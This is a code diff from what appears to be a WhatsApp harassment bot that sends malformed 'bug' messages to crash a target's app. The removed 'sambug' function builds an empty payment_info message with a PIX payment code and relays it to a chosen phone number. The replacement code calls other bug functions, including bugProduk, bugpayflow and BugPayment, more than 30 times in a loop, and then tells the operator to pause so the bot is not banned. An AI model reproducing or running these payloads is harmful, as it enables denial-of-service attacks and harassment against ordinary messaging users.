@@ -604,53 +604,7 @@ async function bugProduk(target, kuwoted) {
       }), {userJid: target, quoted: kuwoted});
       await sam.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id});
 }
-async function sambug(jid) {
-await sam.relayMessage(
-jid,
-{
-name: "payment_info",
-buttonParamsJson: JSON.stringify({
-currency: "BRL",
-total_amount: { value: 0, offset: 100 },
-reference_id: "4P46GMY57GC",
-type: "physical-goods",
-order: {
-status: "pending",
-subtotal: { value: 0, offset: 100 },
-order_type: "ORDER",
-items: [
-{
-name: "",
-amount: { value: 0, offset: 100 },
-quantity: 0,
-sale_amount: { value: 0, offset: 100 }
-}
-]
-},
-payment_settings: [
-{
-type: "pix_static_code",
-pix_static_code: {
-merchant_name: "meu ovo",
-key: "+5533998586057",
-key_type: "X"
-}
-}
-]
-})
-}
-]
-}
-}
-}
-}
-},
-{
-participant: { jid: jid }
-},
-{ messageId: null }
-);
-	}
+
     async function bugpayflow(userJidx) {
             for (let i = 0; i < 20; i++) {
               const qpaybutton = {
@@ -1648,12 +1602,12 @@ let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(mess.bugrespon)
-await sambug(target);
-await sambug(target)
+await bugpayflow(target);
+await bugpayflow(target)
 for (let j = 0; j < 30; j++) {
-await sambug(target);
-await sambug(target);
-await sambug(target);
+await BugProduk(target);
+await BugPayment(target);
+await bugpayflow(target);
 }
 await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
